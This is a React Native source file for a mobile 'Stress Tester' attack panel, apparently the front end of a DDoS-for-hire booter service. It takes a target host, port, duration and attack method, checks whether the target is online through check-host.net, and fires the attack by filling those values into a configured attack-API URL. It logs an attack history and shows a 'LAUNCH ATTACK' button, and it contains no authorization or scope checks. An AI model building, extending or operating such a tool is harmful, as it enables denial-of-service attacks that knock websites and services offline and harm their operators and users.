import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  TextInput,
  TouchableOpacity,
  StyleSheet,
  ScrollView,
  ActivityIndicator,
  KeyboardAvoidingView,
  Platform,
  Alert,
  Modal,
  FlatList,
} from 'react-native';
import { Ionicons } from '@expo/vector-icons';
import AsyncStorage from '@react-native-async-storage/async-storage';
import axios from 'axios';

interface Method {
  id: string;
  name: string;
  apiId: string;
}

interface APIConfig {
  id: string;
  name: string;
  url: string;
}

export default function AttackPanel() {
  const [host, setHost] = useState('');
  const [port, setPort] = useState('80');
  const [timeValue, setTimeValue] = useState('60');
  const [selectedMethod, setSelectedMethod] = useState('');
  const [methods, setMethods] = useState<Method[]>([]);
  const [apis, setApis] = useState<APIConfig[]>([]);
  const [loading, setLoading] = useState(false);
  const [checkingTarget, setCheckingTarget] = useState(false);
  const [targetStatus, setTargetStatus] = useState<any>(null);
  const [attackSent, setAttackSent] = useState(false);
  const [maxAllowedTime, setMaxAllowedTime] = useState(300);
  const [showMethodPicker, setShowMethodPicker] = useState(false);

  useEffect(() => {
    loadData();
  }, []);

  const loadData = async () => {
    try {
      const [methodsData, apisData, settings] = await Promise.all([
        AsyncStorage.getItem('methods'),
        AsyncStorage.getItem('apis'),
        AsyncStorage.getItem('settings'),
      ]);

      if (methodsData) {
        const parsedMethods = JSON.parse(methodsData);
        setMethods(parsedMethods);
        if (parsedMethods.length > 0) {
          setSelectedMethod(parsedMethods[0].name);
        }
      }

      if (apisData) {
        setApis(JSON.parse(apisData));
      }

      if (settings) {
        const parsedSettings = JSON.parse(settings);
        setMaxAllowedTime(parsedSettings.maxTimeAllowed || 300);
      }
    } catch (error) {
      console.error('Error loading data:', error);
    }
  };

  const checkTarget = async () => {
    if (!host) {
      Alert.alert('Error', 'Please enter a host');
      return;
    }

    setCheckingTarget(true);
    setTargetStatus(null);

    try {
      const checkType = host.includes('http') ? 'http' : 'ping';
      const cleanHost = host.replace(/^https?:\/\//, '').split('/')[0];

      const url = checkType === 'http'
        ? `https://check-host.net/check-http?host=${cleanHost}&max_nodes=3`
        : `https://check-host.net/check-ping?host=${cleanHost}&max_nodes=3`;

      const response = await axios.get(url, {
        headers: { Accept: 'application/json' },
        timeout: 10000,
      });

      if (response.data && response.data.request_id) {
        setTimeout(async () => {
          try {
            const resultUrl = `https://check-host.net/check-result/${response.data.request_id}`;
            const resultResponse = await axios.get(resultUrl, {
              headers: { Accept: 'application/json' },
            });

            let alive = false;
            if (resultResponse.data) {
              for (const key in resultResponse.data) {
                const value = resultResponse.data[key];
                if (value && Array.isArray(value) && value.length > 0) {
                  alive = true;
                  break;
                }
              }
            }

            setTargetStatus({
              status: alive ? 'alive' : 'unreachable',
              details: resultResponse.data,
            });
          } catch (err) {
            setTargetStatus({ status: 'error', message: 'Error verifying' });
          } finally {
            setCheckingTarget(false);
          }
        }, 2500);
      } else {
        setTargetStatus({ status: 'checking', message: 'Checking...' });
        setCheckingTarget(false);
      }
    } catch (error) {
      console.error('Error checking target:', error);
      setTargetStatus({ status: 'error', message: 'Failed to check target' });
      setCheckingTarget(false);
    }
  };

  const sendAttack = async () => {
    if (!host || !port || !timeValue || !selectedMethod) {
      Alert.alert('Error', 'Please fill all fields');
      return;
    }

    const timeNum = parseInt(timeValue);
    if (timeNum > maxAllowedTime) {
      Alert.alert('Error', `Time cannot exceed ${maxAllowedTime} seconds`);
      return;
    }

    const method = methods.find((m) => m.name === selectedMethod);
    if (!method) {
      Alert.alert('Error', 'Method not found');
      return;
    }

    const api = apis.find((a) => a.id === method.apiId);
    if (!api) {
      Alert.alert('Error', 'API not configured for this method');
      return;
    }

    setLoading(true);
    setAttackSent(false);

    try {
      const cleanHost = host.replace(/^https?:\/\//, '').split('/')[0];
      
      let attackUrl = api.url
        .replace('[host]', cleanHost)
        .replace('[port]', port)
        .replace('[time]', timeValue)
        .replace('[method]', selectedMethod);

      const response = await axios.get(attackUrl, { timeout: 30000 });

      const historyItem = {
        id: Date.now().toString(),
        host: cleanHost,
        port: parseInt(port),
        time: timeNum,
        method: selectedMethod,
        status: 'sent',
        timestamp: new Date().toISOString(),
      };

      const historyData = await AsyncStorage.getItem('history');
      const history = historyData ? JSON.parse(historyData) : [];
      history.unshift(historyItem);
      await AsyncStorage.setItem('history', JSON.stringify(history.slice(0, 100)));

      setAttackSent(true);
      setTimeout(() => setAttackSent(false), 5000);
    } catch (error: any) {
      console.error('Error sending attack:', error);
      
      const historyItem = {
        id: Date.now().toString(),
        host: host.replace(/^https?:\/\//, '').split('/')[0],
        port: parseInt(port),
        time: timeNum,
        method: selectedMethod,
        status: 'failed',
        timestamp: new Date().toISOString(),
      };

      const historyData = await AsyncStorage.getItem('history');
      const history = historyData ? JSON.parse(historyData) : [];
      history.unshift(historyItem);
      await AsyncStorage.setItem('history', JSON.stringify(history.slice(0, 100)));

      Alert.alert('Error', 'Failed to send attack');
    } finally {
      setLoading(false);
    }
  };

  return (
    <KeyboardAvoidingView
      behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
      style={styles.container}
    >
      <ScrollView
        style={styles.scrollView}
        contentContainerStyle={styles.scrollContent}
        keyboardShouldPersistTaps="handled"
      >
        {/* Header Logo */}
        <View style={styles.headerLogo}>
          <Ionicons name="shield-half" size={48} color="#00ff9d" />
          <Text style={styles.logoText}>STRESS TESTER</Text>
          <Text style={styles.logoSubtext}>Professional Attack Tool</Text>
        </View>

        {/* Target Status Check */}
        <View style={styles.statusPanel}>
          <View style={styles.panelHeader}>
            <Ionicons name="radar" size={20} color="#00ff9d" />
            <Text style={styles.panelTitle}>Target Status</Text>
          </View>

          <TouchableOpacity
            style={styles.checkButton}
            onPress={checkTarget}
            disabled={checkingTarget}
          >
            {checkingTarget ? (
              <ActivityIndicator color="#000" />
            ) : (
              <>
                <Ionicons name="scan" size={18} color="#000" />
                <Text style={styles.checkButtonText}>Scan Target</Text>
              </>
            )}
          </TouchableOpacity>

          {targetStatus && (
            <View
              style={[
                styles.statusBox,
                targetStatus.status === 'alive' && styles.statusAlive,
                targetStatus.status === 'unreachable' && styles.statusDead,
                targetStatus.status === 'error' && styles.statusError,
              ]}
            >
              <Ionicons
                name={
                  targetStatus.status === 'alive'
                    ? 'checkmark-circle'
                    : targetStatus.status === 'unreachable'
                    ? 'close-circle'
                    : 'alert-circle'
                }
                size={20}
                color="#fff"
              />
              <Text style={styles.statusText}>
                {targetStatus.status === 'alive'
                  ? 'Target Online'
                  : targetStatus.status === 'unreachable'
                  ? 'Target Unreachable'
                  : 'Check Failed'}
              </Text>
            </View>
          )}
        </View>

        {/* Attack Configuration */}
        <View style={styles.attackPanel}>
          <View style={styles.panelHeader}>
            <Ionicons name="flash" size={20} color="#ff3366" />
            <Text style={styles.panelTitle}>Attack Configuration</Text>
          </View>

          <View style={styles.inputGroup}>
            <View style={styles.labelRow}>
              <Ionicons name="globe-outline" size={14} color="#8b92a8" />
              <Text style={styles.label}>Target Host</Text>
            </View>
            <TextInput
              style={styles.input}
              value={host}
              onChangeText={setHost}
              placeholder="example.com or 192.168.1.1"
              placeholderTextColor="#4a5568"
              autoCapitalize="none"
            />
          </View>

          <View style={styles.row}>
            <View style={[styles.inputGroup, styles.halfWidth]}>
              <View style={styles.labelRow}>
                <Ionicons name="link-outline" size={14} color="#8b92a8" />
                <Text style={styles.label}>Port</Text>
              </View>
              <TextInput
                style={styles.input}
                value={port}
                onChangeText={setPort}
                placeholder="80"
                placeholderTextColor="#4a5568"
                keyboardType="numeric"
              />
            </View>

            <View style={[styles.inputGroup, styles.halfWidth]}>
              <View style={styles.labelRow}>
                <Ionicons name="time-outline" size={14} color="#8b92a8" />
                <Text style={styles.label}>Time (s)</Text>
              </View>
              <TextInput
                style={styles.input}
                value={timeValue}
                onChangeText={setTimeValue}
                placeholder="60"
                placeholderTextColor="#4a5568"
                keyboardType="numeric"
              />
            </View>
          </View>

          <View style={styles.inputGroup}>
            <Text style={styles.label}>
              <Ionicons name="hammer-outline" size={14} color="#8b92a8" /> Attack Method
            </Text>
            <TouchableOpacity
              style={styles.pickerButton}
              onPress={() => setShowMethodPicker(true)}
            >
              <Text style={styles.pickerButtonText}>
                {selectedMethod || 'Select Method'}
              </Text>
              <Ionicons name="chevron-down" size={20} color="#00ff9d" />
            </TouchableOpacity>
          </View>

          <TouchableOpacity
            style={[
              styles.attackButton,
              (loading || methods.length === 0) && styles.attackButtonDisabled,
            ]}
            onPress={sendAttack}
            disabled={loading || methods.length === 0}
          >
            {loading ? (
              <ActivityIndicator color="#000" />
            ) : (
              <>
                <Ionicons name="nuclear" size={24} color="#000" />
                <Text style={styles.attackButtonText}>LAUNCH ATTACK</Text>
              </>
            )}
          </TouchableOpacity>

          {attackSent && (
            <View style={styles.successBox}>
              <Ionicons name="checkmark-circle" size={28} color="#000" />
              <Text style={styles.successText}>Attack Sent Successfully</Text>
            </View>
          )}
        </View>

        <View style={styles.infoBox}>
          <Ionicons name="information-circle" size={16} color="#8b92a8" />
          <Text style={styles.infoText}>
            Max time: {maxAllowedTime}s | Configure in Settings
          </Text>
        </View>

        {/* Method Picker Modal */}
        <Modal visible={showMethodPicker} animationType="slide" transparent>
          <View style={styles.modalOverlay}>
            <View style={styles.modalContent}>
              <View style={styles.modalHeader}>
                <Text style={styles.modalTitle}>Select Attack Method</Text>
                <TouchableOpacity onPress={() => setShowMethodPicker(false)}>
                  <Ionicons name="close-circle" size={28} color="#00ff9d" />
                </TouchableOpacity>
              </View>

              <FlatList
                data={methods}
                keyExtractor={(item) => item.id}
                renderItem={({ item }) => (
                  <TouchableOpacity
                    style={[
                      styles.methodItem,
                      selectedMethod === item.name && styles.methodItemSelected,
                    ]}
                    onPress={() => {
                      setSelectedMethod(item.name);
                      setShowMethodPicker(false);
                    }}
                  >
                    <View style={styles.methodItemContent}>
                      <Ionicons name="flash" size={20} color={selectedMethod === item.name ? '#00ff9d' : '#8b92a8'} />
                      <Text style={styles.methodItemText}>{item.name}</Text>
                    </View>
                    {selectedMethod === item.name && (
                      <Ionicons name="checkmark-circle" size={24} color="#00ff9d" />
                    )}
                  </TouchableOpacity>
                )}
                ListEmptyComponent={
                  <View style={styles.emptyContainer}>
                    <Ionicons name="alert-circle-outline" size={48} color="#4a5568" />
                    <Text style={styles.emptyText}>
                      No methods configured
                    </Text>
                    <Text style={styles.emptySubtext}>
                      Go to Config to add methods
                    </Text>
                  </View>
                }
              />
            </View>
          </View>
        </Modal>
      </ScrollView>
    </KeyboardAvoidingView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0a0e1a',
  },
  scrollView: {
    flex: 1,
  },
  scrollContent: {
    padding: 16,
  },
  headerLogo: {
    alignItems: 'center',
    paddingVertical: 24,
    marginBottom: 8,
  },
  logoText: {
    fontSize: 28,
    fontWeight: 'bold',
    color: '#00ff9d',
    marginTop: 12,
    letterSpacing: 2,
  },
  logoSubtext: {
    fontSize: 12,
    color: '#8b92a8',
    marginTop: 4,
    letterSpacing: 1,
  },
  statusPanel: {
    backgroundColor: '#151b2e',
    borderRadius: 16,
    padding: 20,
    marginBottom: 16,
    borderWidth: 1,
    borderColor: '#1f2937',
  },
  attackPanel: {
    backgroundColor: '#151b2e',
    borderRadius: 16,
    padding: 20,
    borderWidth: 1,
    borderColor: '#1f2937',
    marginBottom: 16,
  },
  panelHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 16,
    gap: 8,
  },
  panelTitle: {
    fontSize: 16,
    fontWeight: '700',
    color: '#e5e7eb',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  checkButton: {
    backgroundColor: '#00ff9d',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 14,
    borderRadius: 12,
    gap: 8,
  },
  checkButtonText: {
    color: '#000',
    fontSize: 14,
    fontWeight: '700',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  statusBox: {
    flexDirection: 'row',
    alignItems: 'center',
    padding: 14,
    borderRadius: 10,
    marginTop: 12,
    gap: 10,
  },
  statusAlive: {
    backgroundColor: 'rgba(0, 255, 157, 0.2)',
    borderWidth: 1,
    borderColor: '#00ff9d',
  },
  statusDead: {
    backgroundColor: 'rgba(255, 51, 102, 0.2)',
    borderWidth: 1,
    borderColor: '#ff3366',
  },
  statusError: {
    backgroundColor: 'rgba(251, 191, 36, 0.2)',
    borderWidth: 1,
    borderColor: '#fbbf24',
  },
  statusText: {
    color: '#fff',
    fontSize: 14,
    fontWeight: '600',
  },
  inputGroup: {
    marginBottom: 16,
  },
  label: {
    color: '#8b92a8',
    fontSize: 13,
    fontWeight: '600',
    marginBottom: 8,
    textTransform: 'uppercase',
    letterSpacing: 0.5,
  },
  input: {
    backgroundColor: '#0a0e1a',
    borderWidth: 1,
    borderColor: '#1f2937',
    borderRadius: 10,
    padding: 14,
    color: '#fff',
    fontSize: 15,
  },
  row: {
    flexDirection: 'row',
    gap: 12,
  },
  halfWidth: {
    flex: 1,
  },
  pickerButton: {
    backgroundColor: '#0a0e1a',
    borderWidth: 1,
    borderColor: '#1f2937',
    borderRadius: 10,
    padding: 14,
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
  },
  pickerButtonText: {
    color: '#fff',
    fontSize: 15,
  },
  attackButton: {
    backgroundColor: '#ff3366',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 18,
    borderRadius: 12,
    marginTop: 8,
    gap: 10,
  },
  attackButtonDisabled: {
    backgroundColor: '#2d3748',
    opacity: 0.5,
  },
  attackButtonText: {
    color: '#000',
    fontSize: 16,
    fontWeight: 'bold',
    letterSpacing: 1.5,
  },
  successBox: {
    backgroundColor: '#00ff9d',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 16,
    borderRadius: 12,
    marginTop: 16,
    gap: 10,
  },
  successText: {
    color: '#000',
    fontSize: 16,
    fontWeight: 'bold',
  },
  infoBox: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    gap: 6,
    padding: 12,
  },
  infoText: {
    color: '#8b92a8',
    fontSize: 12,
  },
  modalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.85)',
    justifyContent: 'flex-end',
  },
  modalContent: {
    backgroundColor: '#151b2e',
    borderTopLeftRadius: 24,
    borderTopRightRadius: 24,
    padding: 24,
    maxHeight: '70%',
    borderTopWidth: 2,
    borderColor: '#00ff9d',
  },
  modalHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 20,
  },
  modalTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#fff',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  methodItem: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    padding: 16,
    backgroundColor: '#0a0e1a',
    borderRadius: 12,
    marginBottom: 8,
    borderWidth: 1,
    borderColor: '#1f2937',
  },
  methodItemSelected: {
    borderColor: '#00ff9d',
    backgroundColor: 'rgba(0, 255, 157, 0.1)',
  },
  methodItemContent: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 12,
  },
  methodItemText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
  emptyContainer: {
    alignItems: 'center',
    padding: 32,
  },
  emptyText: {
    color: '#8b92a8',
    fontSize: 16,
    fontWeight: '600',
    marginTop: 12,
  },
  emptySubtext: {
    color: '#4a5568',
    fontSize: 13,
    marginTop: 6,
  },
});